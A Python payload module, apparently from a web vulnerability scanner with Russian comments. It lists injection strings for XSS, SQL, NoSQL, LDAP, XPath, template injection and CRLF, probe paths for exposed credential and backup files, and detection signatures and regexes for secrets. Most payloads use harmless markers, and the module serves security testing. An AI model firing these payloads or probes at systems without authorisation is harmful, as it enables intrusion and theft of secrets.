# scanner/payloads.py
# Полезные нагрузки и сигнатуры для поиска уязвимостей

# Заголовки для HTTP-запросов
HEADERS = {
    "User-Agent": "AdvancedScanner/6.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive"
}

# Полезные нагрузки для XSS. Все payload-ы используют один маркер,
# чтобы сканер мог отличить отражение проверки от обычного HTML.
XSS_PAYLOADS = [
    "<script>window.xssFlag=1</script>",
    "<img src=x onerror=window.xssFlag=1>",
    "<svg onload=window.xssFlag=1>",
    "<details open ontoggle=window.xssFlag=1>",
    "<input autofocus onfocus=window.xssFlag=1>",
    "<body onpageshow=window.xssFlag=1>",
    "<video><source onerror=window.xssFlag=1>",
    "<marquee onstart=window.xssFlag=1>",
    "<object data=javascript:window.xssFlag=1>",
    "<iframe srcdoc='<script>parent.window.xssFlag=1</script>'>",
    "<math><mtext></form><form><mglyph><style></math><img src=x onerror=window.xssFlag=1>",
    "<select autofocus onfocus=window.xssFlag=1>",
    "<keygen autofocus onfocus=window.xssFlag=1>",
    "<a href=javascript:window.xssFlag=1>advscan</a>",
    "<form action=javascript:window.xssFlag=1><input type=submit>",
    "\"><svg/onload=window.xssFlag=1>",
    "\"><img src=x onerror=window.xssFlag=1>",
    "\"><body onload=window.xssFlag=1>",
    "\"><iframe srcdoc='<script>window.xssFlag=1</script>'>",
    "\"><input autofocus onfocus=window.xssFlag=1>",
    "'><script>window.xssFlag=1</script>",
    "'><img src=x onerror=window.xssFlag=1>",
    "' onmouseover='window.xssFlag=1",
    "'><svg onload=window.xssFlag=1>",
    "</textarea><script>window.xssFlag=1</script>",
    "</title><script>window.xssFlag=1</script>",
    "</script><script>window.xssFlag=1</script>",
    "</style><script>window.xssFlag=1</script>",
    "</noscript><script>window.xssFlag=1</script>",
    "` onmouseover=window.xssFlag=1 `",
    "${window.xssFlag=1}",
    "\" autofocus onfocus=window.xssFlag=1 x=\"",
    "';window.xssFlag=1;//",
    "\";window.xssFlag=1;//",
    "\\\";window.xssFlag=1;//",
    "'-window.xssFlag=1-'",
    "\"-window.xssFlag=1-\"",
    "javascript:window.xssFlag=1",
    "data:text/html,<script>window.xssFlag=1</script>",
    "JaVaScRiPt:window.xssFlag=1",
]

# Полезные нагрузки для SQL-инъекций
SQLI_PAYLOADS = [
    "'",
    "\"",
    "')",
    "\")",
    "`",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR true--",
    "') OR true--",
    "' OR TRUE#",
    "' OR 1 LIKE 1--",
    "') OR 1 LIKE 1--",
    "' OR '1'='1'--",
    "') OR ('1'='1'--",
    "\" OR \"1\"=\"1\"--",
    "\") OR (\"1\"=\"1\"--",
    "' OR 'a'='a",
    "' OR 'x' LIKE 'x",
    "') OR ('x' LIKE 'x",
    "admin'--",
    "admin'#",
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'x'='x'--",
    "' AND 'x'='y'--",
    "1 OR 1=1",
    "1) OR (1=1)--",
    "0 OR 1=1",
    "0) OR 1=1--",
    "1' ORDER BY 1--",
    "1' GROUP BY 1--",
    "1' ORDER BY 99--",
    "1' HAVING 1=1--",
    "' UNION SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "') UNION SELECT NULL--",
    "' UNION SELECT @@version,NULL--",
    "' UNION SELECT version(),NULL--",
    "' UNION SELECT sqlite_version(),NULL--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
    "';SELECT 1--",
    "'; SELECT NULL;--",
    "')) OR (('1'='1",
    "%27%20OR%201%3D1--",
]

SQLI_BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    ("' AND 2>1--", "' AND 2>3--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1 OR 1=1", "1 OR 1=2"),
    ("1) AND (1=1", "1) AND (1=2"),
    ("0 OR 2>1", "0 OR 2>3"),
    ("' OR 'abc'='abc", "' OR 'abc'='def"),
    ("1 AND 5 BETWEEN 1 AND 9", "1 AND 5 BETWEEN 9 AND 10"),
    ("1 AND ASCII('A')=65", "1 AND ASCII('A')=66"),
]

SQLI_TIME_PAYLOADS = [
    "' AND SLEEP(4)--",
    "\" AND SLEEP(4)--",
    "'; SELECT pg_sleep(4)--",
    "\"; SELECT pg_sleep(4)--",
    "'; WAITFOR DELAY '0:0:4'--",
    "\"; WAITFOR DELAY '0:0:4'--",
    "1 AND SLEEP(4)",
    "1); SELECT pg_sleep(4)--",
    "1 OR SLEEP(4)",
    "' OR pg_sleep(4)--",
    "'; SELECT CASE WHEN (1=1) THEN pg_sleep(4) ELSE pg_sleep(0) END--",
]

# Полезные нагрузки для Server-Side Template Injection.
# Используем арифметику с редким результатом, чтобы отличить вычисление от отражения.
SSTI_PAYLOADS = [
    ("{{7331*3}}", "21993"),
    ("${7331*3}", "21993"),
    ("<%= 7331*3 %>", "21993"),
    ("#{7331*3}", "21993"),
    ("${{7331*3}}", "21993"),
    ("{% print(7331*3) %}", "21993"),
    ("{{ 7331 * 3 }}", "21993"),
    ("[[${7331*3}]]", "21993"),
    ("{{7331|add:14662}}", "21993"),
    ("{{=7331*3}}", "21993"),
    ("${{=7331*3}}", "21993"),
    ("@(7331*3)", "21993"),
    ("#{ 7331 * 3 }", "21993"),
    ("<% 7331*3 %>", "21993"),
]

# NoSQL payload-ы: строковые варианты для форм и query-параметров.
NOSQL_PAYLOADS = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    "[$ne]=1",
    "[$gt]=",
    "[$where]=return true",
    '{"$where": "return true"}',
    '{"username": {"$ne": null}}',
    '{"password": {"$ne": null}}',
    '{"$or": [{"username": "admin"}, {"username": {"$ne": null}}]}',
    '{"$and": [{"username": {"$ne": null}}, {"password": {"$ne": null}}]}',
    '{"username": {"$regex": "^admin"}}',
    '{"password": {"$exists": true}}',
    "username[$ne]=admin",
    "password[$ne]=x",
    "login[$regex]=.*",
    "' || '1'=='1",
    "'; return true; //",
    "admin' || '1'=='1",
    "\" || \"1\"==\"1",
    "true, $where: '1 == 1'",
]

LDAP_PAYLOADS = [
    "*",
    "*)",
    "*)(&",
    ")(uid=*))(|(uid=*",
    "*)(|(objectClass=*))",
    "admin*)(&(objectClass=*)",
    "admin*",
    "*)(&(cn=*))",
    "*)%00",
    ")(|(password=*))",
    "*)(uid=*))(|(uid=*",
]

XPATH_PAYLOADS = [
    "'",
    "\"",
    "' or '1'='1",
    "\" or \"1\"=\"1",
    "') or ('1'='1",
    "'] | //* | //*[contains('a','a')] | //*['",
    "' or count(/*)>0 or 'a'='b",
    "\" or count(/*)>0 or \"a\"=\"b",
    "x' or name(/*)='users' or 'x'='y",
    "'] | //user | //*['",
]

PROTOTYPE_POLLUTION_PAYLOADS = [
    ("__proto__[advscan_proto]", "ADVSCAN_PROTO_POLLUTED"),
    ("constructor[prototype][advscan_proto]", "ADVSCAN_PROTO_POLLUTED"),
    ("prototype[advscan_proto]", "ADVSCAN_PROTO_POLLUTED"),
    ("__proto__.advscan_proto", "ADVSCAN_PROTO_POLLUTED"),
    ("constructor.prototype.advscan_proto", "ADVSCAN_PROTO_POLLUTED"),
    ("__proto__[isAdmin]", "true"),
    ("constructor[prototype][polluted]", "ADVSCAN_PROTO_POLLUTED"),
]

# Полезные нагрузки для обхода пути
PATH_TRAVERSAL_PAYLOADS = [
    "../advscan-path-marker",
    "../../advscan-path-marker",
    "....//....//advscan-path-marker",
    "%2e%2e/%2e%2e/advscan-path-marker",
    "..%2f..%2fadvscan-path-marker",
    "..%252f..%252fadvscan-path-marker",
    "..\\..\\advscan-path-marker",
    "..%5c..%5cadvscan-path-marker",
    "advscan-path-marker%00",
    "..;/..;/advscan-path-marker",
]

# Неразрушающие маркеры командной инъекции. Не выполняют команды ОС.
OS_CMD_PAYLOADS = [
    "ADVSCAN_CMD_MARKER",
    "'ADVSCAN_CMD_MARKER'",
    "\"ADVSCAN_CMD_MARKER\"",
]

# SSRF проверяется только маркерами, без внутренних/metadata адресов.
SSRF_PAYLOADS = [
    "https://example.com/advscan-ssrf-marker",
    "https://example.net/advscan-ssrf-marker",
]

# LFI/RFI маркеры без чтения системных файлов и stream wrappers.
LFI_RFI_PAYLOADS = [
    "../advscan-lfi-marker.txt",
    "../../advscan-lfi-marker.txt",
    "....//....//advscan-lfi-marker.txt",
    "..%2f..%2fadvscan-lfi-marker.txt",
    "data://text/plain,ADVSCAN_LFI_MARKER",
]

# Полезные нагрузки для HTTP Parameter Pollution (расширенный список)
HPP_PAYLOADS = [
    "id=1&id=2",
    "param[]=1&param[]=2",
    "admin=true",
    "key=value&key=override",
    "1&polluted=1",
    "true",
    "false",
    "0",
    "2",
    "null",
    "undefined",
    "[]",
    "{}",
    "admin",
    "guest",
    "1,2",
    "override",
]

# Полезные нагрузки для Open Redirect
OPEN_REDIRECT_PAYLOADS = [
    "https://example.com",
    "https://example.com/",
    "//example.com",
    "///example.com",
    "https:%2f%2fexample.com",
    "/%2f%2fexample.com",
    "/%5cexample.com",
    "///%5cexample.com",
    "/\\example.com",
    "http://example.com",
    "https://example.com%2f%2e%2e",
    "https://example.com%00.example.test",
    "https://example.com@example.test",
    "https://example.test.example.com",
    "\\\\example.com\\share",
    "////example.com/%2e%2e",
]

# Response splitting / CRLF injection. Значения отправляются как параметры,
# а не как сырые заголовки, чтобы requests корректно кодировал перевод строки.
CRLF_PAYLOADS = [
    "%0d%0aX-Advscan-CRLF: 1",
    "%0aX-Advscan-CRLF: 1",
    "\r\nX-Advscan-CRLF: 1",
    "\nX-Advscan-CRLF: 1",
    "%0d%0aSet-Cookie:%20advscan_crlf=1",
    "%E5%98%8A%E5%98%8DX-Advscan-CRLF:%201",
    "%0d%0aContent-Length:%200%0d%0a%0d%0a",
    "%0d%0aLocation:%20https://example.com",
    "%23%0d%0aX-Advscan-CRLF:%201",
]

# Полезные нагрузки для фаззинга заголовков
HEADER_FUZZ_PAYLOADS = [
    "<script>window.xssFlag=1</script>",
    "<svg onload=window.xssFlag=1>",
    "' OR '1'='1'--",
    "%0d%0aX-Advscan-Header: 1",
    "ADVSCAN_HEADER_MARKER",
    "{{7331*3}}",
    "Mozilla/5.0 ADVSCAN_HEADER_MARKER",
    "[$ne]=1",
    "*)(&",
]

# Общие параметры для фаззинга
FUZZ_PARAMS = [
    "'",
    "\"",
    "<script>window.xssFlag=1</script>",
    "<svg onload=window.xssFlag=1>",
    "{{7331*3}}",
    '{"$ne": null}',
    "%0d%0aX-Advscan-CRLF: 1",
    "*)(&",
    "' or '1'='1",
    "__proto__[advscan_proto]=ADVSCAN_PROTO_POLLUTED",
    "../advscan-path-marker",
    "ADVSCAN_MARKER",
    "https://example.com",
]

# Аккуратные проверки распространенных открытых служебных файлов.
COMMON_EXPOSURE_PATHS = [
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.env.development",
    "/.env.backup",
    "/.git/config",
    "/.git/HEAD",
    "/.svn/entries",
    "/.hg/hgrc",
    "/config.php.bak",
    "/config.php~",
    "/settings.py",
    "/settings.py.bak",
    "/application.properties",
    "/application.yml",
    "/backup.zip",
    "/backup.tar.gz",
    "/site.zip",
    "/www.zip",
    "/backup.sql",
    "/db.sql",
    "/dump.sql",
    "/database.sql",
    "/mysql.sql",
    "/users.sql",
    "/data.sql",
    "/latest.sql",
    "/wp-config.php.bak",
    "/wp-config.php~",
    "/config.yaml",
    "/config.yml",
    "/docker-compose.yml",
    "/.docker/config.json",
    "/.npmrc",
    "/.yarnrc",
    "/pnpm-lock.yaml",
    "/composer.lock",
    "/package-lock.json",
    "/phpinfo.php",
    "/server-status",
    "/actuator/env",
    "/actuator/health",
    "/actuator/configprops",
    "/actuator/heapdump",
    "/actuator/mappings",
    "/actuator/beans",
    "/actuator/loggers",
    "/actuator/threaddump",
    "/swagger.json",
    "/openapi.json",
    "/api-docs",
    "/v2/api-docs",
    "/v3/api-docs",
    "/swagger-ui.html",
    "/docs",
    "/redoc",
    "/debug",
    "/debug/default/view",
    "/_profiler",
    "/.idea/workspace.xml",
    "/.well-known/security.txt",
]

SOURCE_MAP_CANDIDATES = [
    "/static/js/main.js.map",
    "/assets/app.js.map",
    "/app.js.map",
    "/main.js.map",
    "/bundle.js.map",
]

GRAPHQL_PATHS = [
    "/graphql",
    "/api/graphql",
    "/v1/graphql",
    "/v2/graphql",
    "/gql",
    "/api/gql",
    "/admin/graphql",
    "/query",
]

GRAPHQL_INTROSPECTION_QUERY = (
    "query AdvscanIntrospection { __schema { queryType { name } mutationType { name } types { name } } }"
)

# Сигнатуры ошибок для SQL-инъекций (расширенный список)
ERROR_SIGS_SQL = [
    "SQL syntax", "mysql_fetch", "ORA-", "syntax error at or near", "unclosed quotation",
    "MySQL server version", "PostgreSQL", "sqlite3", "SQLITE", "Microsoft SQL Server",
    "ODBC SQL", "DB2", "You have an error in your SQL", "unexpected end of SQL",
    "SQL command not properly ended", "unknown column", "table or view does not exist",
    "division by zero", "SQLSTATE", "HY000", "42000", "42S02", "1064", "1054",
    "near \")\": syntax error", "invalid query", "Incorrect syntax near",
    "mysql_num_rows", "mysql_result", "pg_query", "pg_exec", "psql:",
    "warning: sqlite", "native client", "sql server driver",
    "sqliteexception", "postgresexception", "psqlexception", "mysqlsyntaxerrorexception",
    "quoted string not properly terminated", "unterminated quoted string",
    "supplied argument is not a valid mysql", "valid postgresql result",
    "sqlite error", "mariadb", "sqlsrv", "pdoexception",
]

ERROR_SIGS_NOSQL = [
    "mongoerror", "mongodb", "bson", "casterror", "objectid",
    "unknown operator", "$where", "nosql", "invalid bson",
    "failed to parse filter", "cannot use $", "e11000 duplicate key",
    "document must be an object", "badvalue", "javascript execution failed",
    "cannot deserialize", "operator injection", "unknown top level operator",
    "invalid query selector", "where clause", "mapreduce",
]

ERROR_SIGS_LDAP = [
    "ldapexception", "ldap error", "invalid dn syntax", "javax.naming",
    "directory operation", "operations error", "protocol error",
    "size limit exceeded", "ldap_search", "ldap_bind",
    "bad search filter", "invalid search filter", "filter error",
    "unbalanced parenthesis", "namingexception",
]

ERROR_SIGS_XPATH = [
    "xpathexception", "xpath error", "invalid xpath", "xpath syntax",
    "msxml", "system.xml.xpath", "libxml2", "xml path language",
    "unclosed literal", "expected token",
    "xml parsing error", "xml query", "invalid predicate",
    "node-set", "xpath_eval", "simplexml",
]

# Сигнатуры ошибок для обхода пути (расширенный список)
ERROR_SIGS_PATH = [
    "root:x:0:0:", "[drivers]", "No such file or directory",
    "dir:", "file:", "path:", "Permission denied", "dir (",
    "/etc/passwd", "/etc/shadow", "hosts", "win.ini", "boot.ini",
    "not accessible", "directory traversal", "path traversal",
    "invalid file path", "file not found", "access denied",
    "failed to open dir", "illegal characters in path", "requested file is outside",
    "stream does not exist", "realpath", "canonical path",
]

# Сигнатуры ошибок для инъекции команд ОС (расширенный список)
ERROR_SIGS_OS = [
    "uid=", "gid=", "root:x", "whoami", "dir",
    "bash:", "sh:", "cmd.exe", "powershell", "command not found",
    "id", "cat", "ls", "echo", "ping", "curl", "wget",
    "nc: command", "netcat", "executed successfully",
    "system command", "execution result", "output:",
    "advscan_cmd_marker",
]

# Сигнатуры ошибок для LFI/RFI (расширенный список)
ERROR_SIGS_LFI = [
    "root:x:0:0:", "php://filter", "include_path", "failed to open stream",
    "/etc/passwd", "/etc/shadow", "hosts", "config.php", "wp-config.php",
    "open_basedir restriction", "file inclusion", "local file inclusion",
    "remote file inclusion", "include(", "require(", "fopen(",
    "Permission denied", "No such file", "file_get_contents(",
    "stream failed", "base64 encoded", "data://", "expect://",
    "failed opening required", "failed opening", "is not within the allowed path",
    "wrapper is disabled", "operation failed", "include_once(",
]

SENSITIVE_PATTERNS = [
    ("AWS Access Key", r"\bAKIA[0-9A-Z]{16}\b"),
    ("GitHub Token", r"\bgh[pousr]_[A-Za-z0-9_]{20,}\b"),
    ("Google API Key", r"\bAIza[0-9A-Za-z_-]{25,}\b"),
    ("Slack Token", r"\bxox[baprs]-[0-9A-Za-z-]{10,}\b"),
    ("Stripe Live Secret", r"\bsk_live_[0-9A-Za-z]{16,}\b"),
    ("JWT", r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b"),
    ("Private Key", r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----"),
    ("Database URL", r"\b(?:postgres|postgresql|mysql|mongodb(?:\+srv)?|redis)://[^\s\"'<>]+"),
    ("Generic API Key", r"\bapi[_-]?key['\"\s:=]{1,8}[A-Za-z0-9_\-]{20,}\b"),
    ("Client Secret", r"\bclient[_-]?secret['\"\s:=]{1,8}[A-Za-z0-9_\-]{20,}\b"),
    ("Access Token", r"\baccess[_-]?token['\"\s:=]{1,8}[A-Za-z0-9_\-\.]{20,}\b"),
    ("Refresh Token", r"\brefresh[_-]?token['\"\s:=]{1,8}[A-Za-z0-9_\-\.]{20,}\b"),
    ("Firebase URL", r"\bhttps://[a-z0-9-]+\.firebaseio\.com\b"),
    ("Sentry DSN", r"\bhttps://[a-f0-9]{16,32}@[a-z0-9.-]+\.ingest\.sentry\.io/[0-9]+\b"),
    ("Heroku API Key", r"\bheroku[_-]?api[_-]?key['\"\s:=]{1,8}[A-Za-z0-9-]{20,}\b"),
    ("Basic Auth URL", r"\bhttps?://[^/\s\"'<>:@]{3,}:[^@\s\"'<>]{3,}@[^\s\"'<>]+\b"),
]

# Карта уровней серьезности уязвимостей (без изменений)
SEVERITY_MAP = {
    "XSS": "High",
    "SQL Injection": "Critical",
    "SQL Injection (time-based)": "Critical",
    "SQL Injection (fuzz)": "High",
    "NoSQL Injection": "High",
    "LDAP Injection": "High",
    "XPath Injection": "High",
    "Prototype Pollution": "High",
    "Server-Side Template Injection": "High",
    "GraphQL Introspection": "Medium",
    "Source Map Disclosure": "Low",
    "CRLF Injection": "Medium",
    "Weak Security Header": "Low",
    "Path Traversal": "High",
    "Path Traversal (fuzz)": "High",
    "OS Command Injection": "Critical",
    "OS Command Injection (fuzz)": "Critical",
    "SSRF": "Critical",
    "CSRF": "Medium",
    "IDOR": "High",
    "LFI/RFI": "High",
    "HTTP Parameter Pollution": "Medium",
    "Open Redirect": "Medium",
    "Sensitive File/Dir Found": "Low",
    "Insecure HTTP Methods": "Medium",
    "Unencrypted connection": "Medium",
    "Permissive CORS": "Medium",
    "Cookie Missing Security Flag": "Low",
    "Missing Security Header": "Low",
    "Information Disclosure": "Low",
    "Mixed Content": "Low",
    "Directory Listing": "Medium",
    "Info": "Info",
}
